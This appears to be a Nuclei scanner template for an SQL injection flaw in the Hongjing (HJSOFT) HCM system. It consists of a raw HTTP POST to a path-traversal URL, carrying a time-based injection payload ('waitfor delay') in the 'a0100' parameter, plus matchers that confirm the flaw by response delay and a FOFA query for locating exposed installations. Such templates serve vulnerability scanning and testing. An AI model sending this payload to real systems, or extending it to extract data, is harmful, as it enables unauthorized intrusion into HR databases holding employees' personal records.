id: hjsoft-general-info-view-sqli

info:
  name: 宏景 HCM 系统 general/info/view - sqli
  author: leadlife
  severity: high
  description:
  reference:
    - https://github.com/wy876/POC/blob/7b901f2d74fd35dab03f6ebeb289c9d2e14ddaa0/%E5%AE%8F%E6%99%AFOA/%E5%AE%8F%E6%99%AFHCM%E7%B3%BB%E7%BB%9FinfoView%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-qeury: app="HJSOFT-HCM"
    sqlmap: 
    tips: 
  tags: hjsoft,sqli,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /templates/attestation/../../general/info/view HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cache-Control: max-age=0
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1

        kind=1&a0100=1';waitfor+delay+'0:0:6'+--


    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
          - len(body) == 0
        condition: and
          
